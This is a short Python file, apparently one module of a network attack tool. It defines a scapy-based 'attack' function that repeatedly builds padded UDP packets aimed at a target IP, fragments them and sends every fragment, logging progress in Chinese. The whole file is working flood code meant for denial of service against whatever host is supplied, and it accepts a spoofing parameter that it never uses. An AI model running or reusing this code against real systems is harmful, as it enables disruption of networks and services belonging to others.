from scapy.all import IP, UDP, fragment, send


def attack(ip, packet_count, log_func, spoof_ip=None):
    log_func(f"[Fragmentation] 對 {ip} 發送碎片封包")
    for i in range(packet_count):
        pkt = IP(dst=ip) / UDP() / ("X"*600)
        fragments = fragment(pkt)
        for frag in fragments:
            send(frag, verbose=False)
        log_func(f"[Fragmentation] 第 {i+1} 組碎片封包已送出")
    return True